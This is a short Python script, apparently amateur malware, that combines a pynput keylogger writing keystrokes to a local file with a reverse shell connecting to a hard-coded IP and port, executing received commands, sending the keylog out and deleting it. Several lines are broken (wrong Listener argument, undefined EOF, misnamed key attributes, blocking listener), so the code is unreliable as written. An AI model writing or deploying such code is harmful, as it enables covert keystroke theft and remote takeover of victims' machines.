import socket
import os
import subprocess #library that uses python to interact with the system os
from pynput import keyboard

log = 'keylog.txt'

key = ''

def tofile(key):
    with open(log, "a") as file: #all keys will be appended onto the log text file
        if key == keyboard.key.enter:
            file.write("\n")
            file.close()
        elif key == keyboard.key.space:
            file.write(' ')
            file.close()
        else:
            file.write(key)
            file.close()

with keyboard.Listener(tofile = tofile) as listener:
    listener.join()

server_ip = '172.17.85.168' #using my ip
server_port = 9999 
target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_socket.connect((server_ip, server_port))
while True:
    command = target_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    target_socket.send(output.encode())

#sending keylog file to server
file = open(log, "r")
logged = file.read()
while logged != EOF:
    target_socket.send(str(logged).encode())
    logged = file.read()
file.close()
#deleting keylog file afterwards
os.remove(file)

target_socket.close()
